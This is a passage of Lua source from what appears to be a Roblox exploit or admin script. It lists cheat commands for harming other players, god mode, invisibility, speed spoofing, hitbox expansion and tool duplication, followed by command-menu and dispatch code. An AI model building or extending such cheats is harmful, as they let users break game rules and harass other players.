	CMDs[#CMDs + 1] = {NAME = 'fireproximityprompts / firepp [name]', DESC = 'Uses all proximity prompts in a game or uses the optional name'}
	CMDs[#CMDs + 1] = {NAME = 'instantproximityprompts / instantpp', DESC = 'Disable the cooldown for proximity prompts'}
	CMDs[#CMDs + 1] = {NAME = 'uninstantproximityprompts / uninstantpp', DESC = 'Undo the cooldown removal'}
	CMDs[#CMDs + 1] = {NAME = 'tpunanchored / tpua [plr]', DESC = 'Teleports unanchored parts to a player'}
	CMDs[#CMDs + 1] = {NAME = 'animsunanchored / freezeua', DESC = 'Freezes unanchored parts'}
	CMDs[#CMDs + 1] = {NAME = 'thawunanchored / thawua / unfreezeua', DESC = 'Thaws unanchored parts'}
	CMDs[#CMDs + 1] = {NAME = 'removeterrain / rterrain / noterrain', DESC = 'Removes all terrain'}
	CMDs[#CMDs + 1] = {NAME = 'clearnilinstances / nonilinstances / cni', DESC = 'Removes nil instances'}
	CMDs[#CMDs + 1] = {NAME = 'destroyheight / dh [num]', DESC = 'Sets FallenPartsDestroyHeight'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'fullbright / fb (CLIENT)', DESC = 'Makes the map brighter / more visible'}
	CMDs[#CMDs + 1] = {NAME = 'loopfullbright / loopfb (CLIENT)', DESC = 'Makes the map brighter / more visible but looped'}
	CMDs[#CMDs + 1] = {NAME = 'unloopfullbright / unloopfb', DESC = 'Unloops fullbright'}
	CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
	CMDs[#CMDs + 1] = {NAME = 'day (CLIENT)', DESC = 'Changes the time to day for the client'}
	CMDs[#CMDs + 1] = {NAME = 'night (CLIENT)', DESC = 'Changes the time to night for the client'}
	CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
	CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
	CMDs[#CMDs + 1] = {NAME = 'globalshadows / gshadows (CLIENT)', DESC = 'Enables global shadows'}
	CMDs[#CMDs + 1] = {NAME = 'noglobalshadows / nogshadows (CLIENT)', DESC = 'Disables global shadows'}
	CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
	CMDs[#CMDs + 1] = {NAME = 'light [radius] [brightness] (CLIENT)', DESC = 'Gives your player dynamic light'}
	CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'inspect / examine [plr]', DESC = 'Opens InspectMenu for a certain player'}
	CMDs[#CMDs + 1] = {NAME = 'age [plr]', DESC = 'Tells you the age of a player'}
	CMDs[#CMDs + 1] = {NAME = 'chatage [plr]', DESC = 'Chats the age of a player'}
	CMDs[#CMDs + 1] = {NAME = 'joindate / jd [plr]', DESC = 'Tells you the date the player joined Roblox'}
	CMDs[#CMDs + 1] = {NAME = 'chatjoindate / cjd [plr]', DESC = 'Chats the date the player joined Roblox'}
	CMDs[#CMDs + 1] = {NAME = 'copyname / copyuser [plr]', DESC = 'Copies a players full username to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'userid / id [plr]', DESC = 'Notifies a players user ID'}
	CMDs[#CMDs + 1] = {NAME = 'copyuserid / copyid [plr]', DESC = 'Copies a players user ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'appearanceid / aid [plr]', DESC = 'Notifies a players appearance ID'}
	CMDs[#CMDs + 1] = {NAME = 'copyappearanceid / caid [plr]', DESC = 'Copies a players appearance ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'bang [plr] [speed]', DESC = 'owo'}
	CMDs[#CMDs + 1] = {NAME = 'unbang', DESC = 'uwu'}
	CMDs[#CMDs + 1] = {NAME = 'carpet [plr]', DESC = 'Be someones carpet'}
	CMDs[#CMDs + 1] = {NAME = 'uncarpet', DESC = 'Undoes carpet'}
	CMDs[#CMDs + 1] = {NAME = 'friend [plr]', DESC = 'Sends a friend request to certain players'}
	CMDs[#CMDs + 1] = {NAME = 'unfriend [plr]', DESC = 'Unfriends certain players'}
	CMDs[#CMDs + 1] = {NAME = 'headsit [plr]', DESC = 'Sit on a players head'}
	CMDs[#CMDs + 1] = {NAME = 'walkto / follow [plr]', DESC = 'Follow a player'}
	CMDs[#CMDs + 1] = {NAME = 'pathfindwalkto / pathfindfollow [plr]', DESC = 'Follow a player using pathfinding'}
	CMDs[#CMDs + 1] = {NAME = 'pathfindwalktowaypoint / pathfindwalktowp [waypoint]', DESC = 'Walk to a waypoint using pathfinding'}
	CMDs[#CMDs + 1] = {NAME = 'unwalkto / unfollow', DESC = 'Stops following a player'}
	CMDs[#CMDs + 1] = {NAME = 'stareat / stare [plr]', DESC = 'Stare / look at a player'}
	CMDs[#CMDs + 1] = {NAME = 'unstareat / unstare [plr]', DESC = 'Disables stareat'}
	CMDs[#CMDs + 1] = {NAME = 'rolewatch [group id] [role name]', DESC = 'Notify if someone from a watched group joins the server'}
	CMDs[#CMDs + 1] = {NAME = 'rolewatchstop / unrolewatch', DESC = 'Disable Rolewatch'}
	CMDs[#CMDs + 1] = {NAME = 'rolewatchleave', DESC = 'Toggle if you should leave the game if someone from a watched group joins the server'}
	CMDs[#CMDs + 1] = {NAME = 'attach [plr] (TOOL)', DESC = 'Attaches you to a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'kill [plr] (TOOL)', DESC = 'Kills a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastkill [plr] (TOOL)', DESC = 'Kills a player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'handlekill / hkill [plr] (TOOL)', DESC = 'Kills a player using tool damage (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'bring [plr] (TOOL)', DESC = 'Brings a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastbring [plr] (TOOL)', DESC = 'Brings a player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'teleport / tp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastteleport / fasttp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
	CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
	CMDs[#CMDs + 1] = {NAME = 'invisfling', DESC = 'Enables invisible fling'}
	CMDs[#CMDs + 1] = {NAME = 'loopoof', DESC = 'Loops everyones character sounds (everyone can hear)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
	CMDs[#CMDs + 1] = {NAME = 'muteboombox [plr]', DESC = 'Mutes someones boombox'}
	CMDs[#CMDs + 1] = {NAME = 'unmuteboombox [plr]', DESC = 'Unmutes someones boombox'}
	CMDs[#CMDs + 1] = {NAME = 'hitbox [plr] [size]', DESC = 'Expands the hitbox for players HumanoidRootPart (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'headsize [plr] [size]', DESC = 'Expands the head size for players Head (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'reset', DESC = 'Resets your character normally'}
	CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
	CMDs[#CMDs + 1] = {NAME = 'refresh / re', DESC = 'Respawns and brings you back to the same position'}
	CMDs[#CMDs + 1] = {NAME = 'god', DESC = 'Makes your character difficult to kill in most games'}
	CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
	CMDs[#CMDs + 1] = {NAME = 'visible / vis', DESC = 'Makes you visible to other players'}
	CMDs[#CMDs + 1] = {NAME = 'toolinvisible / toolinvis / tinvis', DESC = 'Makes you invisible to other players and able to use tools'}
	CMDs[#CMDs + 1] = {NAME = 'speed / ws / walkspeed [num]', DESC = 'Change your walkspeed'}
	CMDs[#CMDs + 1] = {NAME = 'spoofspeed / spoofws [num]', DESC = 'Spoofs your WalkSpeed on the Client'}
	CMDs[#CMDs + 1] = {NAME = 'loopspeed / loopws [num]', DESC = 'Loops your walkspeed'}
	CMDs[#CMDs + 1] = {NAME = 'unloopspeed / unloopws', DESC = 'Turns off loopspeed'}
	CMDs[#CMDs + 1] = {NAME = 'hipheight / hheight [num]', DESC = 'Adjusts hip height'}
	CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower / jp [num]', DESC = 'Change a players jump height'}
	CMDs[#CMDs + 1] = {NAME = 'spoofjumppower / spoofjp [num]', DESC = 'Spoofs your JumpPower on the Client'}
	CMDs[#CMDs + 1] = {NAME = 'loopjumppower / loopjp [num]', DESC = 'Loops your jump height'}
	CMDs[#CMDs + 1] = {NAME = 'unloopjumppower / unloopjp', DESC = 'Turns off loopjumppower'}
	CMDs[#CMDs + 1] = {NAME = 'maxslopeangle / msa [num]', DESC = 'Adjusts MaxSlopeAngle'}
	CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num] (CLIENT)', DESC = 'Change your gravity'}
	CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
	CMDs[#CMDs + 1] = {NAME = 'lay / laydown', DESC = 'Makes your character lay down'}
	CMDs[#CMDs + 1] = {NAME = 'sitwalk', DESC = 'Makes your character sit while still being able to walk'}
	CMDs[#CMDs + 1] = {NAME = 'nosit', DESC = 'Prevents your character from sitting'}
	CMDs[#CMDs + 1] = {NAME = 'unnosit', DESC = 'Disables nosit'}
	CMDs[#CMDs + 1] = {NAME = 'jump', DESC = 'Makes your character jump'}
	CMDs[#CMDs + 1] = {NAME = 'infinitejump / infjump', DESC = 'Allows you to jump before hitting the ground'}
	CMDs[#CMDs + 1] = {NAME = 'uninfinitejump / uninfjump', DESC = 'Disables infjump'}
	CMDs[#CMDs + 1] = {NAME = 'flyjump', DESC = 'Allows you to hold space to fly up'}
	CMDs[#CMDs + 1] = {NAME = 'unflyjump', DESC = 'Disables flyjump'}
	CMDs[#CMDs + 1] = {NAME = 'autojump / ajump', DESC = 'Automatically jumps when you run into an object'}
	CMDs[#CMDs + 1] = {NAME = 'unautojump / unajump', DESC = 'Disables autojump'}
	CMDs[#CMDs + 1] = {NAME = 'edgejump / ejump', DESC = 'Automatically jumps when you get to the edge of an object'}
	CMDs[#CMDs + 1] = {NAME = 'unedgejump / unejump', DESC = 'Disables edgejump'}
	CMDs[#CMDs + 1] = {NAME = 'platformstand / stun', DESC = 'Enables PlatformStand'}
	CMDs[#CMDs + 1] = {NAME = 'unplatformstand / unstun', DESC = 'Disables PlatformStand'}
	CMDs[#CMDs + 1] = {NAME = 'norotate / noautorotate', DESC = 'Disables AutoRotate'}
	CMDs[#CMDs + 1] = {NAME = 'unnorotate / autorotate', DESC = 'Enables AutoRotate'}
	CMDs[#CMDs + 1] = {NAME = 'enablestate [StateType]', DESC = 'Enables a humanoid state type'}
	CMDs[#CMDs + 1] = {NAME = 'disablestate [StateType]', DESC = 'Disables a humanoid state type'}
	CMDs[#CMDs + 1] = {NAME = 'team [team name] (CLIENT)', DESC = 'Changes your team. Sometimes fools localscripts.'}
	CMDs[#CMDs + 1] = {NAME = 'nobillboardgui / nobgui / noname', DESC = 'Removes billboard and surface guis from your players (i.e. name guis at cafes)'}
	CMDs[#CMDs + 1] = {NAME = 'loopnobgui / loopnoname', DESC = 'Loop removes billboard and surface guis from your players (i.e. name guis at cafes)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopnobgui / unloopnoname', DESC = 'Disables loopnobgui'}
	CMDs[#CMDs + 1] = {NAME = 'nohead / headless', DESC = 'Removes your head (uses simulation radius)'}
	CMDs[#CMDs + 1] = {NAME = 'noarms', DESC = 'Removes your arms'}
	CMDs[#CMDs + 1] = {NAME = 'nolegs', DESC = 'Removes your legs'}
	CMDs[#CMDs + 1] = {NAME = 'nolimbs', DESC = 'Removes your limbs'}
	CMDs[#CMDs + 1] = {NAME = 'naked (CLIENT)', DESC = 'Removes your clothing'}
	CMDs[#CMDs + 1] = {NAME = 'noface / removeface', DESC = 'Removes your face'}
	CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
	CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
	CMDs[#CMDs + 1] = {NAME = 'blocktool', DESC = 'Turns the currently selected tool into a block'}
	CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
	CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
	CMDs[#CMDs + 1] = {NAME = 'nohats / deletehats / rhats', DESC = 'Deletes your hats'}
	CMDs[#CMDs + 1] = {NAME = 'hatspin / spinhats', DESC = 'Spins your characters accessories'}
	CMDs[#CMDs + 1] = {NAME = 'unhatspin / unspinhats', DESC = 'Undoes spinhats'}
	CMDs[#CMDs + 1] = {NAME = 'clearhats / cleanhats', DESC = 'Clears hats in the workspace'}
	CMDs[#CMDs + 1] = {NAME = 'chardelete / cd [instance name]', DESC = 'Removes any part with a certain name from your character'}
	CMDs[#CMDs + 1] = {NAME = 'chardeleteclass / cdc [class name]', DESC = 'Removes any part with a certain classname from your character'}
	CMDs[#CMDs + 1] = {NAME = 'deletevelocity / dv / removeforces', DESC = 'Removes any velocity / force instances in your character'}
	CMDs[#CMDs + 1] = {NAME = 'weaken [num]', DESC = 'Makes your character less dense'}
	CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Sets your characters CustomPhysicalProperties to default'}
	CMDs[#CMDs + 1] = {NAME = 'strengthen [num]', DESC = 'Makes your character more dense (CustomPhysicalProperties)'}
	CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Sets your characters CustomPhysicalProperties to default'}
	CMDs[#CMDs + 1] = {NAME = 'breakvelocity', DESC = 'Sets your characters velocity to 0'}
	CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
	CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
	CMDs[#CMDs + 1] = {NAME = 'vr', DESC = 'Loads CLOVR by Abacaxl'}
	CMDs[#CMDs + 1] = {NAME = 'split', DESC = 'Splits your character in half'}
	CMDs[#CMDs + 1] = {NAME = 'nilchar', DESC = 'Sets your characters parent to nil'}
	CMDs[#CMDs + 1] = {NAME = 'unnilchar / nonilchar', DESC = 'Sets your characters parent to workspace'}
	CMDs[#CMDs + 1] = {NAME = 'noroot / removeroot / rroot', DESC = 'Removes your characters HumanoidRootPart'}
	CMDs[#CMDs + 1] = {NAME = 'replaceroot', DESC = 'Replaces your characters HumanoidRootPart'}
	CMDs[#CMDs + 1] = {NAME = 'clearcharappearance / clearchar / clrchar', DESC = 'Removes all accessory, shirt, pants, charactermesh, and bodycolors'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character perform an animation (must be by roblox to replicate)'}
	CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
	CMDs[#CMDs + 1] = {NAME = 'undance', DESC = 'Stops dance animations'}
	CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
	CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
	CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
	CMDs[#CMDs + 1] = {NAME = 'noanim', DESC = 'Disables your animations'}
	CMDs[#CMDs + 1] = {NAME = 'reanim', DESC = 'Restores your animations'}
	CMDs[#CMDs + 1] = {NAME = 'animspeed [num]', DESC = 'Changes the speed of your current animation'}
	CMDs[#CMDs + 1] = {NAME = 'copyanimation / copyanim / copyemote [plr]', DESC = 'Copies someone elses animation'}
	CMDs[#CMDs + 1] = {NAME = 'loopanimation / loopanim', DESC = 'Loops your current animation'}
	CMDs[#CMDs + 1] = {NAME = 'stopanimations / stopanims', DESC = 'Stops running animations'}
	CMDs[#CMDs + 1] = {NAME = 'refreshanimations / refreshanims', DESC = 'Refreshes animations'}
	CMDs[#CMDs + 1] = {NAME = 'allowcustomanim / allowcustomanimations', DESC = 'Lets you use custom animation packs instead'}
	CMDs[#CMDs + 1] = {NAME = 'unallowcustomanim / unallowcustomanimations', DESC = 'Doesn\'t let you use custom animation packs instead'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'autoclick [click delay] [release delay]', DESC = 'Automatically clicks your mouse with a set delay'}
	CMDs[#CMDs + 1] = {NAME = 'unautoclick / noautoclick', DESC = 'Turns off autoclick'}
	CMDs[#CMDs + 1] = {NAME = 'autokeypress [key] [down delay] [up delay]', DESC = 'Automatically presses a key with a set delay'}
	CMDs[#CMDs + 1] = {NAME = 'unautokeypress', DESC = 'Stops autokeypress'}
	CMDs[#CMDs + 1] = {NAME = 'hovername', DESC = 'Shows a players username when your mouse is hovered over them'}
	CMDs[#CMDs + 1] = {NAME = 'unhovername / nohovername', DESC = 'Turns off hovername'}
	CMDs[#CMDs + 1] = {NAME = 'mousesensitivity / ms [0-10]', DESC = 'Sets your mouse sensitivity (affects first person and right click drag) (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'clickdelete', DESC = 'Go to settings>Keybinds>Add for clicktp'}
	CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settings>Keybinds>Add for click tp'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
	CMDs[#CMDs + 1] = {NAME = 'notools / removetools / deletetools', DESC = 'Removes tools from character and backpack'}
	CMDs[#CMDs + 1] = {NAME = 'deleteselectedtool / dst', DESC = 'Removes any currently selected tools'}
	CMDs[#CMDs + 1] = {NAME = 'grabtools', DESC = 'Automatically get tools that are dropped'}
	CMDs[#CMDs + 1] = {NAME = 'ungrabtools / nograbtools', DESC = 'Disables grabtools'}
	CMDs[#CMDs + 1] = {NAME = 'copytools [plr] (CLIENT)', DESC = 'Copies a players tools'}
	CMDs[#CMDs + 1] = {NAME = 'dupetools / clonetools [num]', DESC = 'Duplicates your inventory tools a set ammount of times'}
	CMDs[#CMDs + 1] = {NAME = 'givetool / givetools', DESC = 'Gives all the tools you\'re holding to [plr] using the attach method.'}
	CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
	CMDs[#CMDs + 1] = {NAME = 'droppabletools', DESC = 'Makes your tools droppable'}
	CMDs[#CMDs + 1] = {NAME = 'equiptools', DESC = 'Equips every tool in your inventory at once'}
	CMDs[#CMDs + 1] = {NAME = 'unequiptools', DESC = 'Unequips every tool you are currently holding at once'}
	CMDs[#CMDs + 1] = {NAME = 'removespecifictool [name]', DESC = 'Automatically remove a specific tool from your inventory'}
	CMDs[#CMDs + 1] = {NAME = 'unremovespecifictool [name]', DESC = 'Stops removing a specific tool from your inventory'}
	CMDs[#CMDs + 1] = {NAME = 'clearremovespecifictool', DESC = 'Stop removing all specific tools from your inventory'}
	CMDs[#CMDs + 1] = {NAME = 'reach [num]', DESC = 'Increases the hitbox of your held tool'}
	CMDs[#CMDs + 1] = {NAME = 'unreach / noreach', DESC = 'Turns off reach'}
	CMDs[#CMDs + 1] = {NAME = 'grippos [X Y Z]', DESC = 'Changes your current tools grip position'}
	CMDs[#CMDs + 1] = {NAME = 'usetools [ammount] [delay]', DESC = 'Activates all tools in your backpack at the same time'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'addalias [cmd] [alias]', DESC = 'Adds an alias to a command'}
	CMDs[#CMDs + 1] = {NAME = 'removealias [alias]', DESC = 'Removes a custom alias'}
	CMDs[#CMDs + 1] = {NAME = 'clraliases', DESC = 'Removes all custom aliases'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'addplugin / plugin [name]', DESC = 'Add a plugin via command'}
	CMDs[#CMDs + 1] = {NAME = 'removeplugin / deleteplugin [name]', DESC = 'Remove a plugin via command'}
	CMDs[#CMDs + 1] = {NAME = 'reloadplugin [name]', DESC = 'Reloads a plugin'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'breakloops / break (cmd loops)', DESC = 'Stops any cmd loops (;100^1^cmd)'}
	CMDs[#CMDs + 1] = {NAME = 'removecmd / deletecmd', DESC = 'Removes a command until the admin is reloaded'}
	CMDs[#CMDs + 1] = {NAME = 'tpwalk / teleportwalk [num]', DESC = 'Teleports you to your move direction'}
	CMDs[#CMDs + 1] = {NAME = 'untpwalk / unteleportwalk', DESC = 'Undoes tpwalk / teleportwalk'}
	CMDs[#CMDs + 1] = {NAME = 'notifyping / ping', DESC = 'Notify yourself your ping'}
	CMDs[#CMDs + 1] = {NAME = 'trip', DESC = 'Makes your character fall over'}
	CMDs[#CMDs + 1] = {NAME = 'norender', DESC = 'Disable 3d Rendering to decrease the amount of CPU the client uses'}
	CMDs[#CMDs + 1] = {NAME = 'render', DESC = 'Enable 3d Rendering'}
	CMDs[#CMDs + 1] = {NAME = 'use2022materials / 2022materials', DESC = 'Enables 2022 material textures'}
	CMDs[#CMDs + 1] = {NAME = 'unuse2022materials / un2022materials', DESC = 'Disables 2022 material textures'}
	wait()

	for i = 1, #CMDs do
		local newcmd = Example:Clone()
		newcmd.Parent = CMDsF
		newcmd.Visible = false
		newcmd.Text = CMDs[i].NAME
		newcmd.Name = "CMD"
		table.insert(text1, newcmd)
		if CMDs[i].DESC ~= "" then
			newcmd:SetAttribute("Title", CMDs[i].NAME)
			newcmd:SetAttribute("Desc", CMDs[i].DESC)
			newcmd.MouseButton1Down:Connect(function()
				if not IsOnMobile and newcmd.Visible and newcmd.TextTransparency == 0 then
					local currentText = Cmdbar.Text
					Cmdbar:CaptureFocus()
					autoComplete(newcmd.Text, currentText)
					maximizeHolder()
				end
			end)
		end
	end

	IndexContents("", true)

	function checkTT()
		local t
		local guisAtPosition = COREGUI:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)

		for _, gui in pairs(guisAtPosition) do
			if gui.Parent == CMDsF then
				t = gui
			end
		end

		if t ~= nil and t:GetAttribute("Title") ~= nil then
			local x = IYMouse.X
			local y = IYMouse.Y
			local xP
			local yP
			if IYMouse.X > 200 then
				xP = x - 201
			else
				xP = x + 21
			end
			if IYMouse.Y > (IYMouse.ViewSizeY-96) then
				yP = y - 97
			else
				yP = y
			end
			Tooltip.Position = UDim2.new(0, xP, 0, yP)
			Description.Text = t:GetAttribute("Desc")
			if t:GetAttribute("Title") ~= nil then
				Title_3.Text = t:GetAttribute("Title")
			else
				Title_3.Text = ''
			end
			Tooltip.Visible = true
		else
			Tooltip.Visible = false
		end
	end

	function FindInTable(tbl,val)
		if tbl == nil then return false end
		for _,v in pairs(tbl) do
			if v == val then return true end
		end 
		return false
	end

	function GetInTable(Table, Name)
		for i = 1, #Table do
			if Table[i] == Name then
				return i
			end
		end
		return false
	end

	function respawn(plr)
		if invisRunning then TurnVisible() end
		local char = plr.Character
		if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
		char:ClearAllChildren()
		local newChar = Instance.new("Model")
		newChar.Parent = workspace
		plr.Character = newChar
		wait()
		plr.Character = char
		newChar:Destroy()
	end

	local refreshCmd = false
	function refresh(plr)
		refreshCmd = true
		local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
		local pos = Human and Human.RootPart and Human.RootPart.CFrame
		local pos1 = workspace.CurrentCamera.CFrame
		respawn(plr)
		task.spawn(function()
			plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
			refreshCmd = false
		end)
	end

	local lastDeath

	function onDied()
		task.spawn(function()
			if pcall(function() Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') end) and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
					if getRoot(Players.LocalPlayer.Character) then
						lastDeath = getRoot(Players.LocalPlayer.Character).CFrame
					end
				end)
			else
				wait(2)
				onDied()
			end
		end)
	end

	Clip = true
	spDelay = 0.1
	Players.LocalPlayer.CharacterAdded:Connect(function()
		NOFLY()
		Floating = false

		if not Clip then
			execCmd('clip')
		end

		repeat wait() until getRoot(Players.LocalPlayer.Character)

		pcall(function()
			if spawnpoint and not refreshCmd and spawnpos ~= nil then
				wait(spDelay)
				getRoot(Players.LocalPlayer.Character).CFrame = spawnpos
			end
		end)

		onDied()
	end)

	onDied()

	function getstring(begin)
		local start = begin-1
		local AA = '' for i,v in pairs(cargs) do
			if i > start then
				if AA ~= '' then
					AA = AA .. ' ' .. v
				else
					AA = AA .. v
				end
			end
		end
		return AA
	end

	findCmd=function(cmd_name)
		for i,v in pairs(cmds)do
			if v.NAME:lower()==cmd_name:lower() or FindInTable(v.ALIAS,cmd_name:lower()) then
				return v
			end
		end
		return customAlias[cmd_name:lower()]
	end

	function splitString(str,delim)
		local broken = {}
		if delim == nil then delim = "," end
		for w in string.gmatch(str,"[^"..delim.."]+") do
			table.insert(broken,w)
		end
		return broken
	end

	cmdHistory = {}
	local lastCmds = {}
	local historyCount = 0
	local split=" "
	local lastBreakTime = 0
	function execCmd(cmdStr,speaker,store)
		cmdStr = cmdStr:gsub("%s+$","")
		task.spawn(function()
			local rawCmdStr = cmdStr
			cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
			local commandsToRun = splitString(cmdStr,"\\")
			for i,v in pairs(commandsToRun) do
				v = string.gsub(v,"%%BackSlash%%","\\")
				local x,y,num = v:find("^(%d+)%^")
				local cmdDelay = 0
				local infTimes = false
				if num then
					v = v:sub(y+1)
					local x,y,del = v:find("^([%d%.]+)%^")
					if del then
						v = v:sub(y+1)
						cmdDelay = tonumber(del) or 0
					end
				else
					local x,y = v:find("^inf%^")
					if x then
						infTimes = true
						v = v:sub(y+1)
						local x,y,del = v:find("^([%d%.]+)%^")
						if del then
							v = v:sub(y+1)
							del = tonumber(del) or 1
							cmdDelay = (del > 0 and del or 1)
						else
							cmdDelay = 1
						end
					end
				end
				num = tonumber(num or 1)

				if v:sub(1,1) == "!" then
					local chunks = splitString(v:sub(2),split)
					local g = chunks[1]
					if chunks[1] and lastCmds[g] then v = lastCmds[g] end
				end

				local args = splitString(v,split)
				local cmdName = args[1]
				local cmd = findCmd(cmdName)
				if cmd then
					table.remove(args,1)
					cargs = args
					if not speaker then speaker = Players.LocalPlayer end
					if store then
						if speaker == Players.LocalPlayer then
							if cmdHistory[1] ~= rawCmdStr and rawCmdStr:sub(1,11) ~= 'lastcommand' and rawCmdStr:sub(1,7) ~= 'lastcmd' then
								table.insert(cmdHistory,1,rawCmdStr)
							end
						end
						if #cmdHistory > 30 then table.remove(cmdHistory) end

						lastCmds[cmdName] = v
					end
					local cmdStartTime = tick()
					if infTimes then
						while lastBreakTime < cmdStartTime do
							local success,err = pcall(cmd.FUNC,args, speaker)
							if not success and _G.IY_DEBUG then
								warn("Command Error:", cmdName, err)
							end
							wait(cmdDelay)
						end
					else
						for rep = 1,num do
							if lastBreakTime > cmdStartTime then break end
							local success,err = pcall(function()
								cmd.FUNC(args, speaker)
							end)
							if not success and _G.IY_DEBUG then
								warn("Command Error:", cmdName, err)
							end
							if cmdDelay ~= 0 then wait(cmdDelay) end
						end
					end
				end
			end
		end)
	end	

	function addcmd(name,alias,func,plgn)
		cmds[#cmds+1]=
			{
				NAME=name;
				ALIAS=alias or {};
				FUNC=func;
				PLUGIN=plgn;
			}
	end

	function removecmd(cmd)
		if cmd ~= " " then
			for i = #cmds,1,-1 do
				if cmds[i].NAME == cmd or FindInTable(cmds[i].ALIAS,cmd) then
					table.remove(cmds, i)
					for a,c in pairs(CMDsF:GetChildren()) do
						if string.find(c.Text, "^"..cmd.."$") or string.find(c.Text, "^"..cmd.." ") or string.find(c.Text, " "..cmd.."$") or string.find(c.Text, " "..cmd.." ") then
							c.TextTransparency = 0.7
							c.MouseButton1Click:Connect(function()
								notify(c.Text, "Command has been disabled by you or a plugin")
							end)
						end
					end
				end
			end
		end
	end

	function addbind(cmd,key,iskeyup,toggle)
		if toggle then
			binds[#binds+1]=
				{
					COMMAND=cmd;
					KEY=key;
					ISKEYUP=iskeyup;
					TOGGLE = toggle;
				}
		else
			binds[#binds+1]=
				{
					COMMAND=cmd;
					KEY=key;
					ISKEYUP=iskeyup;
				}
		end
	end

	function addcmdtext(text,name,desc)
		local newcmd = Example:Clone()
		local tooltipText = tostring(text)
		local tooltipDesc = tostring(desc)
		newcmd.Parent = CMDsF
		newcmd.Visible = false
		newcmd.Text = text
		newcmd.Name = 'PLUGIN_'..name
		table.insert(text1,newcmd)
		if desc and desc ~= '' then
			newcmd:SetAttribute("Title", tooltipText)
			newcmd:SetAttribute("Desc", tooltipDesc)
			newcmd.MouseButton1Down:Connect(function()
				if newcmd.Visible and newcmd.TextTransparency == 0 then
					Cmdbar:CaptureFocus()
					autoComplete(newcmd.Text)
					maximizeHolder()
				end
			end)
		end
	end

	local WorldToScreen = function(Object)
